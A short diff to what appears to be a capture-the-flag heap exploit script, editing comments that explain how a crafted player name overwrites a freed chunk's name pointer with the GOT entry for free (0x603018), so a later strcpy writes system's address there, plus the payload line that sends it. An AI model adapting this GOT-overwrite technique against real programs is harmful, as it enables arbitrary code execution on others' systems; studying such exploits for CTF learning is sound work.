@@ -87,9 +87,10 @@ if __name__ == "__main__":
     # so, 'selected' overlaps with chunk E-2 (player name "EEEEE....")
     # so, (removed) chunk A-1 overlaps with chunk E-2.
     # so, a carefully crafted name for chunk E will overwrite chunk A-1's name_ptr
-    # and future set_name() will reference the overwritten pointer.
+    # and future set_name() on the removed chunk A will reference the overwritten pointer.
     # -> strcpy(*(char **)(selected + 16), &s);
-    # *(select + 16) == 0x603018
+    # -> *(select + 16) == 0x603018
+    # -> strcpy(0x603018, system_addr)
 
     add('E'*16 + p64(b.got['free']), 0xfe)
     raw_input('after adding E...')
